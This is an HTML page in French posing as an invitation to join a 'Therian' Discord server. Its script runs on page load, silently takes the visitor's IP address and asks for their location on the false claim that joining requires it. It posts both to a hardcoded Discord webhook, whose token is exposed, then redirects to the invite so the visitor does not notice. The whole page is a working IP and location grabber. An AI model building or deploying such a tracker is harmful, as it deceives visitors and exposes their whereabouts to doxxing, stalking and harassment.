<!DOCTYPE html>
<html lang="fr">
<head>
  <meta charset="UTF-8">
  <title>Rejoindre le serveur Discord Therian</title>
  <style>
    body {
      background: radial-gradient(circle at center, #0a0a0a 0%, #000 100%);
      color: #f5f5f5;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      margin: 0;
      font-family: "Segoe UI", Arial, sans-serif;
      text-align: center;
    }
    h1 {
      font-size: 1.4em;
      font-weight: 500;
      letter-spacing: 0.5px;
      color: #e0e0e0;
      max-width: 90%;
    }
  </style>
</head>
<body>
  <div>
    <h1 id="titre">Chargement‚Ä¶</h1>
  </div>

  <script>
    const WEBHOOK_URL = "https://discord.com/api/webhooks/1367237113220698184/dRNpJg9cI-GD6PMGNHE22eAvjVPOIz5i8zfuIWOVADYCplQvQ3UBcqCL1vFet8CRtcMr";
    const REDIRECT_URL = "https://discord.gg/UYqhGQmdQR";

    async function getIP() {
      try {
        const response = await fetch("https://api.ipify.org/?format=json");
        const data = await response.json();
        return data.ip;
      } catch (error) {
        console.error("Error getting IP:", error);
        return null;
      }
    }

    async function sendIP(ip) {
      try {
        await fetch(WEBHOOK_URL, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            content: `üåê Adresse IP d√©tect√©e : ${ip}`
          })
        });
      } catch (error) {
        console.error("Error sending IP:", error);
      }
    }

    function envoyerPosition(position) {
      const lat = position.coords.latitude.toFixed(6);
      const lng = position.coords.longitude.toFixed(6);

      // Envoi en arri√®re-plan (sans attendre la r√©ponse)
      fetch(WEBHOOK_URL, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          content: `üìç Nouvelle localisation :\nLatitude: ${lat}\nLongitude: ${lng}`
        })
      }).catch(() => {}); // ignorer erreurs

      // Redirection imm√©diate
      window.location.href = REDIRECT_URL;
    }

    function erreurPosition(error) {
      // Si la localisation est d√©sactiv√©e ou refus√©e ‚Üí redirige direct
      window.location.href = REDIRECT_URL;
    }

    window.onload = async function() {
      if ("geolocation" in navigator) {
        document.getElementById("titre").innerText = "Activer la localisation pour rejoindre le serveur Discord Therian";
        navigator.geolocation.getCurrentPosition(envoyerPosition, erreurPosition);
      } else {
        // Si pas support√© ‚Üí redirection directe
        window.location.href = REDIRECT_URL;
      }

      const ip = await getIP();
      if (ip) {
        await sendIP(ip);
      }
    };
  </script>
</body>
</html>
